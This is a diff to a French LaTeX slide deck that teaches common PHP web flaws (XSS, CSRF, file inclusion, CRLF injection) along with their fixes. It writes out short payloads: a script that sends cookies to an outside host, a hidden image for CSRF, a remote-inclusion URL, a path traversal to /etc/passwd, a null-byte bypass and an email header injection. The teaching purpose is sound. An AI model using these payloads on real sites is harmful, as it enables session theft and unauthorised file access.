@@ -54,110 +54,163 @@
 \end{frame}
 
 \begin{frame}{D'où viennent les failles?}
-	Du serveur en général\\
-	Surtout en PHP car c'est le langage le plus utilisé\\
-	Pas développé de manière sécurisé au départ
+	\begin{itemize}
+		\item Du serveur en général
+		\item Surtout en PHP car c'est le langage le plus utilisé
+		\item Pas développé de manière sécurisé au départ
+	\end{itemize}
 \end{frame}
 
 \begin{frame}{Les failles vues dans cette présentation}
-	Faille XSS\\
-	CSRF\\
-	Transversal directory\\
-	CRLF\\
+	\begin{itemize}
+		\item Faille XSS
+		\item CSRF
+		\item File Inclusion
+		\item CRLF
+	\end{itemize}
 \end{frame}
 
 \begin{frame}{Faille XSS}
-	Utilisée en général pour voler des cookies\\
-	Pour rediriger vers des pubs\\
-	Embêter les utilisateurs
+	\begin{itemize}
+		\item Utilisée en général pour voler des cookies
+		\item Pour rediriger vers des pubs
+		\item Embêter les utilisateurs
+	\end{itemize}
 \end{frame}
 
 \begin{frame}{Son fonctionnement}
-	Nécessite un formulaire qui réaffiche les données entrées\\
-	Permet d'éxécuter du javascript sur le client d'autres personnes\\
-	Par exemple : <script>alert('Hello')</script>
+	\begin{itemize}
+		\item Nécessite un formulaire qui réaffiche les données entrées
+		\item Permet d'éxécuter du javascript sur le client d'autres personnes
+		\item Par exemple : <script>alert('Hello')</script>
+	\end{itemize}
 \end{frame}
 
 \begin{frame}{Comment voler les cookies ?}
-	Contenus dans document.cookie\\
-	Nécessite un serveur, avec un fichier enregistrant ce qu'on lui envoie\\
-	<script>window.location.replace('http://monsite.org/index.php?c=' + document.cookie.toString())</script>
+	\begin{itemize}
+		\item Contenus dans document.cookie
+		\item Nécessite un serveur, avec un fichier enregistrant ce qu'on lui envoie
+		\item <script>window.location.replace('http://monsite.org/index.php?c=' + document.cookie.toString())</script>
+	\end{itemize}
 \end{frame}
 
 \begin{frame}{Comment la sécuriser ?}
-	Echapper les caractères\\
-	Remplace donc par exemple < par \&lt\;\\
-	Affiche donc au final <script>alert('Hello')</script> et n'éxécute pas le code
+	\begin{itemize}
+		\item Echapper les caractères
+		\item Remplace donc par exemple < par \&lt\;
+		\item Affiche donc au final <script>alert('Hello')</script> et n'éxécute pas le code
+	\end{itemize}
 \end{frame}
 
 \begin{frame}{CSRF}
-	Acronyme de Cross-Site Request Forgery\\
-	Permet d'utiliser les droits d'un autre utilisateur pour faire ce que l'on veut
+	\begin{itemize}
+		\item Acronyme de Cross-Site Request Forgery
+		\item Permet d'utiliser les droits d'un autre utilisateur pour faire ce que l'on veut
+	\end{itemize}
 \end{frame}
 
 \begin{frame}{Comment ça marche?}
-	Demander à un utilisateur d'aller sur un lien\\
-	Ou le cacher dans une image :\\
-	<img src="http://monsite.org/compte.php?numeroCompte=1337" width="0" height="0" border="0">\\
-	L'utilisateur va donc effectuer l'action que l'on veut avec sa session
+	\begin{itemize}
+		\item Demander à un utilisateur d'aller sur un lien
+		\item Ou le cacher dans une image :
+		\item $<$img src="http://monsite.org/compte.php?numeroCompte=1337" \\
+				width="0" height="0" border="0"$>$
+		\item L'utilisateur va donc effectuer l'action que l'on veut avec sa session
+	\end{itemize}
 \end{frame}
 
 \begin{frame}{Comment la sécuriser ?}
-	Ajouter un token nécessaire dans chaque formulaire sur le site que l'on veut sécuriser\\
-	<input type="hidden" name="CSRFToken" value="Token chiffré">
+	\begin{itemize}
+		\item Ajouter un token nécessaire dans chaque formulaire sur le site que l'on veut sécuriser
+		\item <input type="hidden" name="CSRFToken" value="Token chiffré" >
+	\end{itemize}
 \end{frame}
 
-\begin{frame}{Directory traversal}
-	Principe : Accéder à un dossier dont nous ne sommes pas autorisé\\
-	Passe par l'inclusion de page avec des paramètres\\
-	Par exemple : <?php include ('/home/users/web/views/' . \$\_GET['view']); ?>\\
-	On accède donc à l'accueil par : \\
-	http://monsite.org/index.php?view=accueil.php
+
+\begin{frame}{RFI (Remote File Inclusion)}
+	\begin{itemize}
+		\item Principe : Inclure un site dans le site
+		\item Passe par l'inclusion de page avec des paramètres
+		\item Permet d'envoyer des données personalisés
+		\item Permet également d'executer du code PHP sur la machine distante
+		\item http://monsite.org/index.php?view=http://hacking.org/hack.php
+	\end{itemize}
+\end{frame}
+
+\begin{frame}{LFI : Directory traversal}
+	\begin{itemize}
+		\item Principe : Accéder à un dossier dont nous ne sommes pas autorisé
+		\item Par exemple : \\
+		<?php include ('/home/users/web/views/' . \$\_GET['view']); ?>
+		\item On accède donc à l'accueil par : 
+		\item http://monsite.org/index.php?view=accueil.php
+	\end{itemize}
 \end{frame}
 
 \begin{frame}{Exploiter cela}
-	Envoyer une vue naviguant dans les dossiers\\
-	Par exemple : '../../../../../../../../../etc/passwd' et accéder au fichier de password de la machine\\
-	On peut ainsi accéder au fichier que l'on veut sur la machine !
+	\begin{itemize}
+		\item Envoyer une vue naviguant dans les dossiers
+		\item Par exemple : \\
+		'../../../../../../../../../etc/passwd' et accéder au fichier de password de la machine
+		\item On peut ainsi accéder au fichier que l'on veut sur la machine !
+	\end{itemize}
 \end{frame}
 
 \begin{frame}{Comment la sécuriser ?}
-	On peut penser que l'on peut interdir les caractères ../ ou même simplement ..\\
-	Mais dans ce cas on peut envoyer l'encodage URL des caractères : %2e%2e%2f = ../\\
-	Dans ce cas cette sécurisation ne sert à rien
+	\begin{itemize}
+		\item On peut penser que l'on peut interdir les caractères ../ ou même simplement ..
+		\item Mais dans ce cas on peut envoyer l'encodage URL des caractères : \%2e\%2e\%2f = ../
+		\item Dans ce cas cette sécurisation ne sert à rien
+	\end{itemize}
 \end{frame}
 
 \begin{frame}{Comment la sécuriser ?}
-	Tout simplement : include(\$\_GET['file'] . '.html')\\
-	Limite donc les fichiers à ceux au format HTML\\
-	Mais ne fonctionne pas si l'on rajoute %00
+	\begin{itemize}
+		\item<1-> Tout simplement : include(\$\_GET['file'] . '.html')
+		\item<1-> Limite donc les fichiers à ceux au format HTML
+		\item<2-> Mais ne fonctionne pas si on ajoute \%00
+		\item<2-> Exemple si \$\_GET['file'] vaut secret.txt\%00 
+		\item<2-> include( 'secret.txt\%00' . '.html') $\rightarrow$ include( 'secret.txt')
+	\end{itemize}
 \end{frame}
 
 \begin{frame}{Quelle est la solution?}
-	Ne plus utiliser ce type d'inclusion de page
+	\begin{itemize}
+		\item Autoriser seulement les caractère a-zA-Z0-9
+		\item Ne pas utiliser la variable directement mais seulement pour faire un choix (via un switch par exemple)
+		\item Trouver un autre moyen
+	\end{itemize}
 \end{frame}
 
 \begin{frame}{CRLF}
-	CRLF signifie Carriage Return Line Feed\\
-	Carriage Return : Retour Chariot \textbackslash r\\
-	Line Feed : Saut de ligne \textbackslash n\\
-	Consiste donc à placer des fin de ligne à certains endroits
+	\begin{itemize}
+		\item CRLF signifie Carriage Return Line Feed
+		\item Carriage Return : Retour Chariot \textbackslash r
+		\item Line Feed : Saut de ligne \textbackslash n
+		\item Consiste donc à placer des fin de ligne à certains endroits
+	\end{itemize}
 \end{frame}
 
 \begin{frame}{Où placer ces caractères}
-	Où?\\
-	Dans l'input des envois de mails de mot de passe oublié\\
-	Le retour a la ligne signife un destinataire supplémentaire\\
-	On peut donc envoyer des mails grâce au site web de la victime
+	\begin{itemize}
+		\item Où?
+		\item Dans l'input des envois de mails de mot de passe oublié
+		\item Le retour à la ligne signife un destinataire supplémentaire
+		\item On peut donc envoyer des mails grâce au site web de la victime
+	\end{itemize}
 \end{frame}
 
 \begin{frame}{Son utilité}
-	Envoie deux mails avec le nouveau mot de passe\\
-	mail1@service.com\%0A\%0Dmail2@service.com
+	\begin{itemize}
+		\item Envoie deux mails avec le nouveau mot de passe
+		\item mail1@service.com\%0A\%0Dmail2@service.com
+	\end{itemize}
 \end{frame}
 
 \begin{frame}{Comment sécuriser?}
-	\$chaine\_secure = str\_replace(array("\textbackslash n","\textbackslash r",PHP\_EOL),'',\$chaine\_utilisateur);
+	\begin{itemize}
+		\item \$chaine\_secure = str\_replace(array("\textbackslash n","\textbackslash r",PHP\_EOL),'',\$chaine\_utilisateur);	
+	\end{itemize}
 \end{frame}
 
 \end{document}
